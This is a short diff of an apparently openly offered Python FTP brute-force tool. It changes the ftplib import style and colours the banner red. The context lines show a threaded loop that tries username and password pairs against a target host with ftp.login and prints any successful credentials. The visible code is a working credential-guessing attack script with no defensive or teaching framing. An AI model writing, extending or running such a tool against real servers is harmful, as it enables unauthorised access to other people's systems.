@@ -1,12 +1,13 @@
-import ftplib
+from ftplib import FTP
 import argparse
 import threading
 import queue
 import pyfiglet
 from itertools import product
+import termcolor
 
 asciiBanner = pyfiglet.figlet_format("FTP Brute Force")
-print(asciiBanner)
+print(termcolor.colored(asciiBanner, 'red'))
 
 def parse_args():
     parser = argparse.ArgumentParser(description="Simple FTP Login Bruteforce")
@@ -24,7 +25,7 @@ def bruteForce(host, cred_queue, lock):
             return
         ## FTP Brute Force
         try:
-            ftp = ftplib.FTP(host, timeout=5)
+            ftp = FTP(host, timeout=5)
             ftp.login(username, password)
             with lock:
                 print(f"[SUCCESS] Username: '{username}' Password: '{password}'")
